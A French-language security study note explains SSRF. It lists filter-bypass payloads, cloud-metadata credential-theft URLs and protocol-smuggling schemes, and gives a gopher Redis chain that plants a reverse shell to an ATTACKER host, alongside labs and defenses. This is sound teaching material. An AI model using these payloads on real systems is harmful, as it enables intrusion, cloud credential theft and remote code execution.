---
title: "SSRF"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# 🌐 SSRF — Server-Side Request Forgery

> [!info] **En 1 phrase**
> SSRF = forcer le **serveur** à effectuer des requêtes **à notre place** en manipulant une **URL contrôlée**
> qu'il traite côté serveur → accès à localhost, au réseau interne et aux **metadata cloud** inaccessibles d'ailleurs.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)**

---

## 🎯 Concept

```mermaid
flowchart LR
    A[Attaquant] -->|URL malveillante<br>?url=http://169.254.169.254/| B[Application<br>fetch une URL côté serveur]
    B -->|requête vers l'interne| C[localhost<br>services internes<br>metadata cloud]
    C -->|données sensibles<br>credentials IAM| B
    B -->|réponse brute| A
```

> [!info] 💡 **Pourquoi ça marche**
> L'app accepte une **URL en entrée** (paramètre, webhook, import, proxy d'image, redirect...) et la fetch
> côté serveur. La source est **confiante** (proche du réseau interne) → le firewall ne filtre pas l'intérieur.

---

## 🧭 Définition & distinctions

> SSRF = vulnérabilité où l'attaquant **force un serveur à faire des requêtes vers une destination non
> prévue**. Le serveur traite des URLs/IP fournies par l'utilisateur **sans validation suffisante**.

### Full vs Partial vs Blind SSRF

| Type | Réponse visible ? | Exploitation |
|---|---|---|
| **Full SSRF** | On lit la réponse brute | Lecture fichiers, metadata cloud, scan de ports, proxy HTTP |
| **Partial SSRF** | Seulement statut/erreur/timing | Port scan, détection de services, exfiltration limitée |
| **Blind SSRF** | Aucune réponse lisible | **Out-of-band** uniquement (DNS/HTTP vers collaborator) |

### SSRF vs Open Redirect

| | SSRF | Open Redirect |
|---|---|---|
| Qui fait la requête | Le **serveur** (IP serveur, réseau interne) | Le **navigateur** (IP de la victime) |
| Impact | Accès au réseau interne, metadata cloud, RCE | Phishing, voleur de tokens OAuth |
| Complémentarité | **Un open redirect peut servir de bypass** : l'app valide le domaine du redirect puis le suit → SSRF |

### Les chemins d'exploitation classiques

- **Metadata cloud** : `169.254.169.254` (AWS/Azure/GCP), `100.100.100.200` (Alibaba)
- **Lecture de fichiers** : schéma `file://` → exfiltration de la source
- **Découverte réseau / port scan** : via `http://` sur des IP internes
- **Envoi de paquets à des services internes** : `gopher://`, `dict://` → souvent **RCE** sur un autre serveur
- **Upgrade vers XSS** : inclusion d'un SVG avec JavaScript rendu par le serveur

**Exemple vulnérable** :

```py
url = input("Enter URL:")
response = requests.get(url)
return response
# → http://169.254.169.254/latest/meta-data/ = fuite des infos du compte AWS
```

---

## 🎯 Cibles par défaut

> Les SSRF visent par défaut les services sur **localhost** ou cachés dans le réseau interne.

### localhost / loopback / toutes interfaces

```powershell
http://localhost:80
http://localhost:22
https://localhost:443
http://127.0.0.1:80
http://127.0.0.1:22
https://127.0.0.1:443
http://0.0.0.0:80     # toutes les interfaces
http://0.0.0.0:22
https://0.0.0.0:443
```

### IPv6

```powershell
http://[::]:80/                          # adresse non spécifiée
http://[0000::1]:80/                     # loopback IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]        # embedding IPv4
http://[::ffff:127.0.0.1]                # IPv4-mapped IPv6
http://ip6-localhost                     # hostname /etc/hosts → ::1
http://ip6-loopback                      # idem
```

### Range CIDR loopback

> Le bloc `127.0.0.0/8` est **entièrement** réservé au loopback : toute IP du range résout vers la machine locale.

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Adresses raccourcies (short-hand)

```powershell
http://0/        # → 0.0.0.0
http://127.1     # → 127.0.0.1
http://127.0.1   # → 127.0.0.1
```

### Encodage d'IP

```powershell
# Décimal
http://2130706433/    = 127.0.0.1
http://3232235521/    = 192.168.0.1
http://3232235777/    = 192.168.1.1
http://2852039166/    = 169.254.169.254

# Octal (l'implémentation varie)
http://0177.0.0.1/    = 127.0.0.1
http://o177.0.0.1/    = 127.0.0.1
http://0o177.0.0.1/   = 127.0.0.1
http://q177.0.0.1/    = 127.0.0.1

# Hexadécimal
http://0x7f000001     = 127.0.0.1
http://0xc0a80101     = 192.168.1.1
http://0xa9fea9fe     = 169.254.169.254
```

> [!tip] 💡 **Calcul rapide** : `2130706433 = 127 << 24 | 0 << 16 | 0 << 8 | 1`.
> Outil : **[ipfuscator](https://github.com/dwisiswant0/ipfuscator)** génère toutes les représentations alternatives d'une IP (Go).

---

## 🔀 Bypass de filtres

### 1. Redirections DNS / domaines contrôlés

> Des services DNS gratuits font pointer **n'importe quel sous-domaine vers une IP choisie**. Si le filtre
> bloque `127.0.0.1` mais pas les domaines publics → bypass direct.

| Domaine | Résout vers |
|---|---|
| `localtest.me` | `::1` |
| `localh.st` | `127.0.0.1` |
| `spoofed.[BURP_COLLABORATOR]` | `127.0.0.1` |
| `company.127.0.0.1.nip.io` | `127.0.0.1` |
| `<IP>.nip.io` | l'IP indiquée (nip.io mappe tout `<chose>.<IP>.nip.io` vers l'IP) |

```powershell
http://127.0.0.1.nip.io/     # → 127.0.0.1
```

### 2. Redirect HTTP (302/307/308)

1. Héberger une page sur un **domaine autorisé** qui redirige vers la cible interne (`192.168.0.1`)
2. Pointer le SSRF vers cette page
3. Les codes **307/308** conservent la **méthode HTTP et le body** après redirection (contrairement à 302)

> Service de redirection clé en main : **[r3dir](https://github.com/Horlad/r3dir)** (intégrable à Burp via Hackvertor).

```powershell
# 307 Temporary Redirect → http://localhost
https://307.r3dir.me/--to/?url=http://localhost

# 302 Found → http://169.254.169.254/latest/meta-data/
https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
```

### 3. DNS rebinding

> Un domaine qui **alterne entre deux IPs** (l'une autorisée, l'autre la cible). Le serveur résout une fois
> pour la validation (IP légitime) puis une seconde fois pour le fetch réel (IP cible).

```powershell
# Rotation entre 1.2.3.4 et 169.254.169.254
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms

# Vérifier l'alternance avec nslookup (2 appels → 2 IP différentes)
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

> [!tip] 💡 **Comment ça marche** : TTL très court (ex: 0s) → chaque résolution DNS peut donner une IP différente.
> Le premier lookup (validation) et le second (connexion) ne retombent pas sur la même IP.

### 4. Abuser des divergences de parsing URL

> Recherche **Orange Tsai** (*A New Era Of SSRF — Exploiting URL Parsers*, Black Hat USA 2017) : chaque
> langage/librairie parse l'URL différemment → même payload = IP différentes selon la stack.

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/                    # certains parseurs ajoutent // automatiquement
```

Comportement de `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` selon la librairie :

| Librairie | Destination |
|---|---|
| `urllib2` (Python 2) | `1.1.1.1` |
| `requests` + navigateurs | `2.2.2.2` (redirection) |
| `urllib` (Python 3) | `3.3.3.3` |

> [!warning] ⚠️ **`@` et `#`** : `user@host` force le parseur à voir `host` comme cible alors que la vraie
> connexion va vers `user` ; `#fragment` fait ignorer le début par certains validators. Toujours tester
> plusieurs variantes.

### 5. Bypass PHP `filter_var()` (PHP 7.0.25)

> `FILTER_VALIDATE_URL` valide à tort des URLs malformées → le filtre applicatif est contourné.

```php
<?php
 var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

```powershell
http://test???test.com
0://evil.com:80;http://google.com:80/
```

### 6. TLD réservé `.localhost`

> RFC 2606 : le TLD `.localhost` est réservé → **n'importe quel domaine** `.localhost` résout vers le loopback.

```powershell
$ ping PayloadsAllTheThings.localhost -c 1
PING PayloadsAllTheThings.localhost (::1) 56 data bytes
```

### 7. Autres encodages

```powershell
# URL encoding (simple / double) pour contourner une blacklist
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin

# Alphanumeriques cerclés (full-width) — selon la normalisation du parseur
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

# Unicode : en .NET et Python 3, la regex \d matche aussi ๐๑๒๓๔๕๖๗๘๙ (chiffres thaï)
```

### 8. Schéma `jar:` (Java)

> Lecture **entièrement aveugle** — on ne verra jamais le résultat, mais ça déclenche la requête.

```powershell
jar:scheme://domain/path!/
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

---

## 📡 Exploitation via les URL schemes

### `file://` — lecture de fichiers

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### `http://` — fetch web + port scan

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

### `dict://` — protocole DICT (envoi de chaînes vers un port)

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### `sftp://` & `tftp://` — transfert de fichiers (TCP/UDP)

```powershell
ssrf.php?url=sftp://evil.com:11111/
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### `ldap://` — Lightweight Directory Access Protocol

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### `netdoc://` — wrapper Java

> Alternative au `file://` quand le parseur Java rejette les caractères `\n` / `\r` (e.g. pour des payloads LDAP/SMTP).

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### `gopher://` — le couteau suisse

> Protocole texte léger (pré-web) : **envoie des données brutes à n'importe quel service TCP** → idéal pour
> cibler Redis, Memcached, MySQL, SMTP, Elasticsearch...

```ps1
gopher://[host]:[port]/[type][selector]

# Exemple SMTP : envoyer une ligne MAIL FROM
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

> [!tip] 💡 **Gopher + SSRF = RCE** : les chaînes Redis/Memcached/Tomcat permettent d'écrire des fichiers,
> planter des crons, ou rejouer des commandes → voir la section **🧬 Chaînes Gopher** ci-dessous.

---

## ☁️ Metadata cloud — le jackpot

> L'endpoint `169.254.169.254` (link-local) est accessible **depuis les instances cloud uniquement**. Un SSRF
> le transforme en **vol de credentials IAM** = pivot complet dans le compte cloud.

### AWS (169.254.169.254)

```bash
# Énumération
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/                    # scripts de boot, parfois des secrets
http://169.254.169.254/latest/dynamic/instance-identity/document   # account id, région, instance id

# Récupération des credentials IAM (2 étapes)
# 1. Lister les rôles
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 2. Choisir un rôle → JSON avec AccessKeyId / SecretAccessKey / Token
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# IMDSv2 : il faut d'abord obtenir un token (méthode PUT + header)
PUT /latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# puis l'ajouter à chaque requête :
X-aws-ec2-metadata-token: <TOKEN>
```

> [!warning] ⚠️ **IMDSv2** : depuis 2023 (defense en profondeur AWS), `curl http://169.254.169.254/...`
> renvoie `401` si le token est exigé. Un SSRF **HTTP GET classique ne peut pas faire de PUT**
> (certaines librairies/fonctions limitées par schéma ne le permettent pas) → testez quand même, des instances
> restent en IMDSv1.

### GCP (metadata.google.internal)

```bash
# Nécessite le header  Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# → token OAuth (access_token) utilisable avec : Authorization: Bearer <token>

# Clés du compte de service
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<ACCOUNT>/key

# L'IP link-local fonctionne aussi
http://169.254.169.254/computeMetadata/v1/
```

```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

### Azure (IMDS 169.254.169.254)

```bash
# Nécessite le header  Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Token managé (Managed Identity) — attention au & dans l'URL (double-encodage possible)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

```http
GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

### Alibaba Cloud (100.100.100.200) & Kubernetes

```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://kubernetes.default.svc.cluster.local/
https://kubernetes.default.svc/api/v1/namespaces/default/pods   # exige un token SA
```

---

## 🛠️ Exploitation selon la stack

| Stack | Particularités |
|---|---|
| **PHP** | Nécessite `allow_url_fopen=On` pour les fetch d'URL ; `filter_var()`/`FILTER_VALIDATE_URL` contournable (voir bypass) ; libcurl suit les redirects si `CURLOPT_FOLLOWLOCATION` ; wrappers `file://`, `data://`, `php://`, `zip://` |
| **Python** | Divergences de parsing `urllib`/`urllib2`/`requests` (Orange Tsai) ; regex unicode `\d` en Python 3 ; `requests` suit les redirects par défaut |
| **Java** | Parseur URL permissif : `jar:`, `netdoc://`, URLs malformées tolérées ; lecteur `URLConnection` limité aux schémas connus |
| **Ruby** | `URI` strict sur la syntaxe mais redirection non suivie selon le client utilisé |
| **.NET** | Regex unicode par défaut (`\d` matche les chiffres thaï) ; `WebRequest` suit les redirects (HTTPWebRequest) |
| **Node.js** | `http`/`https` natifs : parsing permissif, schémas inconnus rejetés ; dépend des librairies (axios, fetch suivent les redirects) |

### PHP en détail

```php
// Contexte vulnérable : url_allow_fopen doit être On
// $_GET['url'] passé tel quel à file_get_contents / curl_exec
// Lecture locale avec un filtre "http seulement" ?
// file:// /etc/passwd   (si schéma non restreint)
// data://text/plain;base64,PD9waHAg...   (wrapper data)
// redirects : libcurl ne suit PAS par défaut → il faut CURLOPT_FOLLOWLOCATION
// si l'app l'active et ne re-valide pas la destination → bypass redirect
```

---

## 🙈 Blind SSRF

> Quand **la réponse n'est pas lisible** (erreur générique, page figée, aucune sortie), il faut basculer sur des
> canaux indirects.

### Détection

```bash
# 1. Timing : une requête vers une IP noire répond vite, vers un service ouvert aussi ;
#    une cible qui fait sleep/est lente peut se repérer au délai
?url=http://10.0.0.1:81            # réponse rapide / erreur
?url=http://10.0.0.1:22            # réponse différente si port ouvert
# 2. Out-of-band : envoyer vers notre domaine (Burp Collaborator / interactsh)
?url=http://COLLABORATOR.oastify.com
?url=http://169.254.169.254.oastify.com
# 3. Scanner les ports via le serveur (différence de réponse = port ouvert)
for p in 22 80 443 3306 6379 8000 8080; do
  curl -s -o /dev/null -w "%{http_code} %{time_total} $p\n" "http://x/fetch?url=http://127.0.0.1:$p/"
done
```

### Blind → sortie Out-of-Band (blind-ssrf-chains)

> **assetnote/blind-ssrf-chains** : chaînes prêtes à l'emploi qui transforment un SSRF aveugle en sortie
> lisible (RCE / lecture de fichiers) via les services internes classiques.

**Via HTTP(s)** : Elasticsearch, Weblogic, Hashicorp Consul, Shellshock, Apache Druid, Apache Solr,PeopleSoft, Apache Struts, JBoss, Confluence, Jira (et autres produits Atlassian), OpenTSDB, Jenkins,
Hystrix Dashboard, W3 Total Cache, Docker, Gitlab Prometheus Redis Exporter.

**Via Gopher** : Redis, Memcache, Apache Tomcat.

```bash
# Exemple d'utilisation de la méthodo blind : consul → RCE
# 1. Enregistrer une session dans Consul via le SSRF aveugle
# 2. Faire exécuter la commande → callback HTTP vers notre serveur
# cf. https://github.com/assetnote/blind-ssrf-chains
```

---

## 🧬 Chaînes Gopher — SSRF → RCE

> Le schéma `gopher://` parle **TCP brut** : on peut "rejouer" le protocole d'un service interne. Généré
> automatiquement par **[Gopherus](https://github.com/tarunkant/Gopherus)**.

```bash
# Gopherus — génération de payloads
gopherus --exploit redis
gopherus --exploit memcached
gopherus --exploit mysql
gopherus --exploit postgresql
gopherus --exploit smtp
gopherus --exploit zabbix
```

### Redis → écriture de clé SSH / cron

```ps1
# Chaîne typique (URL-encodée) : CONFIG SET dir + dbfilename + SAVE
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$53%0d%0a%0d%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0d%0a%0d%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

# Exploitation : pointer le SSRF dessus, puis écouter
nc -lvnp 4444
# OU écrire une clé publique SSH dans /root/.ssh/authorized_keys
```

> [!tip] 💡 **Gopher en 3 règles** : `_` après le port = le premier octet à envoyer est après `%0d%0a` ;
> chaque ligne de commande est préfixée par `*N` (RESP) ; `%0d%0a` (CRLF) sépare tout.

---

## 🧰 Outils

| Outil | Usage |
|---|---|
| **[SSRFmap](https://github.com/swisskyrepo/SSRFmap)** | Fuzzer + exploitation automatique de SSRF (port scan, meta, gopher...) |
| **[Gopherus](https://github.com/tarunkant/Gopherus)** | Génère les chaînes `gopher://` → RCE (Redis, MySQL, SMTP...) |
| **[blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)** | SSRF aveugle → sortie OOB via services internes |
| **[See-SURF](https://github.com/In3tinct/See-SURF)** | Scanner Python de paramètres potentiellement SSRF |
| **[SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff)** | Tester en Go si l'app fait vraiment des requêtes serveur |
| **[surf](https://github.com/assetnote/surf)** | Liste les candidats SSRF (fuzz de paramètres) |
| **[ipfuscator](https://github.com/dwisiswant0/ipfuscator)** | Génère toutes les représentations IP alternatives |
| **[r3dir](https://github.com/Horlad/r3dir)** | Service de redirect (302/307) pour bypass sans héberger |
| **Burp Collaborator / interactsh** | Détection et exfiltration out-of-band |
| **`curl`** | Tester notre propre redirect, vérifier les réponses, rejouer les chaînes gopher |
| **`nslookup`** | Vérifier le DNS rebinding / les domaines de redirection |

```bash
# Curl : valider qu'un redirect est suivi (mimic le comportement serveur)
curl -sL -o /dev/null -w "%{http_code} -> %{url_effective}\n" "http://oursite/redirect?to=http://127.0.0.1:8080"
# Vérifier une IP encodée
curl -s http://2130706433/    # doit répondre comme http://127.0.0.1/
```

---

## 🧪 Labs

- PortSwigger Web Security Academy — SSRF (basique localhost, back-end, blacklist, whitelist, open redirect) : https://portswigger.net/web-security/all-labs#server-side-request-forgery
- Root-Me — Server Side Request Forgery : https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery
- Root-Me — Nginx SSRF Misconfiguration : https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration

---

## 🔍 Détection & Défense

| Réponse | Détail |
|---|---|
| **Allowlist DNS** | N'autoriser QUE les domaines attendus ; jamais de blacklist (toujours contournable) |
| **Résolution + validation d'IP** | Résoudre le DNS **côté serveur**, vérifier l'IP N'EST PAS une adresse privée/link-local (RFC 1918, 127.0.0.0/8, ::1, 169.254.0.0/16, 0.0.0.0/8...) AVANT d'ouvrir la connexion |
| **Résolution IP→DNS inverse** | Vérifier que l'IP résolue correspond bien au domaine attendu (anti-DNS rebinding) |
| **Restriction de schémas** | N'accepter que `http`/`https` (jamais `file://`, `gopher://`, `dict://`, `ftp://`...) |
| **Pas de redirect non vérifiée** | Bloquer ou **re-valider** la destination après chaque redirect (307/308 conservent la méthode !) |
| **Protection metadata cloud** | AWS IMDSv2 (token obligatoire), Azure/GCP bloquer le header `Metadata-Flavor`/`Metadata` |
| **Segmentation réseau** | L'app ne doit pas avoir accès direct à l'interne ; egress contrôlé |
| **Moindre privilège** | Le compte de l'app ne doit pas avoir de rôle IAM trop large |
| **Entrées strictes** | Type de l'input (URL préfixée par une constante `https://`), pas d'URL libre |
| **Surveillance** | Logs : requêtes vers `169.254.169.254`, IP internes, schémas anormaux, temps de réponse inhabituels |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **Comment distinguer un SSRF exploitable**
> 1. Repérer les endpoints qui **prennent une URL/domaine en entrée** (import, webhook, proxy d'image, générateur de miniatures, validateurs de lien, redirect).
> 2. Envoyer `http://127.0.0.1:22` vs `http://127.0.0.1:81` → différence de réponse/timing = requête serveur.
> 3. Envoyer `http://COLLABORATOR.oastify.com` → un hit DNS = **blind SSRF** confirmé même sans sortie.
> 4. Si le paramètre est **intégré dans une URL existante** (ex: `https://api.com/load?host=x`), tester la manipulation du path/host.

> [!warning] ⚠️ **Full ≠ Partial ≠ Blind** : adapte la technique à ce que tu vois. Full → metadata cloud et
> lecture fichiers. Partial → port scan. Blind → OOB uniquement, ne perds pas de temps sur des payloads de sortie.

> [!tip] 💡 **Ne jamais faire confiance à une URL fournie**
> Même si l'app a l'air d'être "un simple proxy d'image", c'est un serveur avec accès interne. Toute URL
> acceptée = une porte vers le réseau. Un **open redirect sur un domaine autorisé** devient une passerelle
> pour le SSRF (valider le domaine du redirect, puis suivre vers l'interne).

> [!warning] ⚠️ **Pièges classiques**
> - `localhost`/`127.0.0.1` peuvent être filtrés → passe par `0.0.0.0`, `[::]`, IP décimales/octales/hex, `nip.io`, DNS rebinding, redirect 307.
> - **302 ≠ 307** : après un 302 certains clients ne conservent pas la méthode/le body → préférer 307/308.
> - **DNS rebinding** : le serveur peut résoudre 2 fois ; garder le TTL à 0 et alterner les réponses.
> - Schéma `file://` souvent bloqué → essayer `file://\/\/`, `netdoc://` (Java), encodages.
> - Sur AWS IMDSv2, un simple GET ne suffit plus (token requis) → tester quand même + regarder les autres clouds (GCP/Azure ont des headers obligatoires aussi : `Metadata-Flavor: Google`, `Metadata: true`).
> - Ne jamais rejouer une chaîne gopher avec des CRLF mal encodés : chaque `\r\n` doit être `%0d%0a`.
> - SSRF **aveugle** : si aucune réponse, pense aux chaînes blind-ssrf-chains (Consul, Jenkins, Docker) avant de te déclarer bloqué.

> [!tip] 💡 **SSRF → pivot interne**
> L'interne expose souvent des services mal protégés (Redis, Jenkins, dashboards, Consul). Le SSRF est une
> **porte d'entrée vers tout un réseau** : scanne les ports internes, cherche les services d'admin, et
> enchaîne vers le RCE (chaînes gopher, blind-ssrf-chains).

---

## 🔗 Liens

- [[XSS (Cross-Site Scripting)|🖼️ XSS]] — upgrade d'un SSRF faible en XSS (SVG + JavaScript)
- [[Injection SQL|💾 SQLi]] — souvent combiné au SSRF pour toucher les BDD internes
- [[LFI et RFI|📂 LFI / RFI]] — mêmes primitives de lecture de fichiers
- [[Injection de commandes|🐚 Injection de commandes]] — l'aboutissement RCE
- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
- 📚 Source : [PayloadsAllTheThings — Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
- 🔍 Recherches : Orange Tsai — *A New Era Of SSRF, Exploiting URL Parsers* (Black Hat 2017)
